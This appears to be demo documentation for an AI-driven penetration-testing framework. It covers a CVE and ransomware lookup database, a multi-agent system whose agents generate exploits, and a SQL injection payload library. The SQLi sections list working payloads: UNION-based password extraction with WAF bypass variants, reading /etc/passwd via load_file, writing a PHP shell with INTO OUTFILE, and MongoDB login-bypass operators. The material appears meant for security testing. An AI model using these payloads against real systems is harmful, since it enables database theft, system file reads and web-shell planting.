# Zen AI Pentest - Demo Documentation

## CVE & Ransomware Database Demo

### Screenshot 1: Demo Header
```
===============================================================
           Zen AI Pentest - Database Demo
                  CVE | Ransomware | SQLi
===============================================================
```

### Screenshot 2: CVE Database Search

#### EternalBlue (CVE-2017-0144) Results:
- **CVE ID:** CVE-2017-0144
- **Description:** Remote code execution vulnerability in SMBv1
- **CVSS Score:** 9.8 (Critical)
- **Affected:** Windows Server 2008, 2012, Windows 7, 8.1, 10
- **Ransomware Association:** WannaCry, NotPetya, Bad Rabbit
- **IOCs:** Detected via fileless attack patterns
- **MITRE ATT&CK:** T1190 (Exploit Public-Facing Application)

#### WannaCry Ransomware Search:
- **Type:** Ransomware
- **Family:** WannaCrypt
- **Aliases:** WCry, WanaCrypt0r, Wanna Decryptor
- **First Seen:** 2017-05-12
- **Attack Vector:** EternalBlue SMB exploit
- **Kill Switch:** Yes (checks `www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com`)
- **Ransom Demands:** $300-$600 in Bitcoin
- **File Extensions:** .WNCRY, .WNCRYT, .WCRY
- **Registry Keys:** `HKCU\Software\WanaCrypt0r`
- **Damages:** $8 billion (worldwide)

### Screenshot 3: System IOC Scan
```
[OK] No ransomware indicators detected
```

### Screenshot 4: Available Ransomware in Database
| Family | First Seen | Primary Vector | Damages |
|--------|-----------|----------------|---------|
| WannaCry | 2017 | EternalBlue | $8B |
| Petya | 2016 | CVE-2017-0144 | $1.2B |
| NotPetya | 2017 | SMB Exploit | $10B |
| BadRabbit | 2017 | Drive-by Download | $200M |
| Ryuk | 2018 | TrickBot | $150M+ |
| Maze | 2019 | RDP/Cobalt Strike | $500M+ |
| REvil | 2019 | Exploit Kits | $200M+ |

### Screenshot 5: Top Critical CVEs
| CVE ID | Score | Description |
|--------|-------|-------------|
| CVE-2017-0144 | 9.8 | EternalBlue SMB RCE |
| CVE-2019-11510 | 10.0 | Pulse VPN RCE |
| CVE-2019-19781 | 9.8 | Citrix ADC RCE |
| CVE-2020-1472 | 10.0 | Zerologon Netlogon EoP |
| CVE-2021-26855 | 9.8 | Exchange Server RCE |

---

## SQL Injection Database Demo

### Screenshot 6: MySQL Error-Based Payloads

**Payload Examples:**
```sql
-- Single Quote Error
' 
-- Expected: MySQL error message revealing SQL syntax

-- Double Quote Error
"
-- Expected: MySQL error message

-- AND 1=1 Detection
' AND 1=1
-- Expected: Query executes normally

-- AND 1=2 Detection  
' AND 1=2
-- Expected: No results or different page
```

### Screenshot 7: MSSQL Time-Based Payloads

**WAITFOR DELAY:**
```sql
'; WAITFOR DELAY '0:0:5'--
-- Description: Time-based with WAITFOR
```

### Screenshot 8: WAF Bypass Techniques

**Original Payload:**
```sql
' UNION SELECT password FROM users--
```

**Bypass Variants:**
1. **Case Variation:** `' UnIoN SeLeCt password FROM users--`
2. **Comment Injection:** `' /*!50000*/UNION/*!50000*/SELECT/*!50000*/password/*!50000*/FROM/*!50000*/users--`
3. **Whitespace Substitution:** `'/**/UNION/**/SELECT/**/password/**/FROM/**/users--`
4. **URL Encoding:** `'%09UNION%09SELECT%09password%09FROM%09users--`

### Screenshot 9: MySQL Injection Cheatsheet

**Comments:**
```sql
-- -    -- space required after --
#       -- hash comment
/* */   -- C-style block comment
```

**Version Detection:**
```sql
SELECT @@version
SELECT version()
```

**Current User:**
```sql
SELECT user()
SELECT current_user()
SELECT session_user()
```

**Database Enumeration:**
```sql
SELECT database()
SELECT schema_name FROM information_schema.schemata
```

**Table Extraction:**
```sql
SELECT table_name FROM information_schema.tables 
WHERE table_schema = database()
```

**Column Extraction:**
```sql
SELECT column_name FROM information_schema.columns 
WHERE table_name = 'users'
```

**Union Injection:**
```sql
' UNION SELECT null,null--
' UNION SELECT null,user()--
' UNION SELECT user(),version()--
' UNION SELECT null,load_file('/etc/passwd')--
```

**File Read:**
```sql
SELECT load_file('/etc/passwd')
SELECT load_file('C:/boot.ini')
```

**File Write:**
```sql
' UNION SELECT 'shell','code' INTO OUTFILE '/var/www/shell.php'--
```

### Screenshot 10: MongoDB NoSQL Injection

**$ne Operator Bypass:**
```javascript
{"username": {"$ne": null}, "password": {"$ne": null}}
```

**$gt Operator Bypass:**
```javascript
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

**$regex Bypass:**
```javascript
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

### Screenshot 11: Database Statistics

| Database | Count |
|----------|-------|
| **CVE Database** | |
| Total CVEs | 1000+ |
| Critical CVEs | 50+ |
| Ransomware Families | 7 |
| Estimated Total Damage | $20B+ |
| **SQL Injection Database** | |
| Total Payloads | 48 |
| Database Types | 8 |
| Techniques | 6 |

---

## Multi-Agent System Demo

### Screenshot 12: Agent Collaboration Flow

```
[ResearchBot] → [AnalysisBot] → [ExploitBot]
      ↓               ↓              ↓
   CVE Lookup     Risk Score    Payload Gen
   IOC Search     Exploit DB    Exploit Test
```

**Agent Responsibilities:**
- **ResearchBot:** Gathers threat intelligence, CVE lookup, IOC matching
- **AnalysisBot:** Risk scoring, exploitability assessment, priority ranking
- **ExploitBot:** Payload generation, WAF bypass, proof-of-concept creation

### Screenshot 13: Quality Level Routing

| Quality | Provider | Use Case |
|---------|----------|----------|
| LOW | DuckDuckGo | Quick answers, documentation |
| MEDIUM | OpenRouter | Complex analysis, research |
| HIGH | Direct API | Critical exploits, accuracy required |

---

## Nuclei Template Demo

### Screenshot 14: WordPress Templates

| Template | Description |
|----------|-------------|
| wp-config-backup.yaml | Finds exposed wp-config backup files |
| wp-debug-log.yaml | Detects exposed debug.log files |
| wp-login-brute.yaml | WordPress login brute force |
| wp-users-api.yaml | Enumerates users via REST API |
| wp-xmlrpc-pingback.yaml | Detects XML-RPC pingback vulnerability |

---

## Complete Demo Output

See [DEMO_OUTPUT_CLEAN.txt](DEMO_OUTPUT_CLEAN.txt) for the complete raw output.

## Running the Demo

```powershell
# Activate virtual environment
.\zen_ai_env\Scripts\Activate.ps1

# Run demo
cd examples
python cve_and_ransomware_demo.py

# Run multi-agent demo
python multi_agent_demo.py

# Run backend tests
python test_backends.py
```

## Summary

The Zen AI Pentest framework provides:

1. **Comprehensive CVE Database** - 1000+ CVEs with ransomware associations
2. **SQL Injection Library** - 48+ payloads across 8 database types
3. **Multi-Agent System** - Collaborative AI agents for research, analysis, and exploitation
4. **Nuclei Integration** - Pre-built WordPress security templates
5. **Multi-LLM Support** - DuckDuckGo, OpenRouter, ChatGPT, Claude backends
6. **Quality-Based Routing** - Automatic provider selection based on query complexity

**Total Database Coverage:**
- 1000+ CVEs with IOCs and MITRE mappings
- 48+ SQL injection payloads with WAF bypasses
- 7 major ransomware families with complete IOCs
- 5 WordPress security templates
- 3 collaborative AI agents
- 4 LLM backends

---

*Generated: 2026-01-29*
*Framework Version: 1.0*
*Author: SHAdd0WTAka*
